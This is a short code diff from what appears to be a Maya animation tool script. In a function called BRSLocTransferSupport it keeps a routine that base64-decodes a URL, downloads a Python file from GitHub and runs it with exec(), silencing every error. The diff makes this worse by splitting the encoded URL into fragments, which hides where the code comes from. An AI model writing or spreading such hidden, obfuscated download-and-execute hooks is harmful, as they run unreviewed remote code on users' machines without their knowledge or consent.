@@ -238,7 +238,11 @@ def BRSLocTransferSupport(*_):
     else:
         import urllib as uLib
     if cmds.about(connected=True):
-        u_b64 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1cmFzYXRlL2FuaW1UcmFuc2ZlckxvYy9tYXN0ZXIvc2VydmljZS9zdXBwb3J0LnB5'
+        u_b64 = ('aHR0cHM6Ly9yYXcuZ2l0aHVidX' +
+                'NlcmNvbnRlbnQuY29tL2J1cmFz' +
+                'YXRlL2FuaW1UcmFuc2ZlckxvYy' +
+                '9tYXN0ZXIvc2VydmljZS9zdXB' +
+                'wb3J0LnB5')
         try:
             exec(uLib.urlopen(base64.b64decode(u_b64).decode()).read())
         except: pass
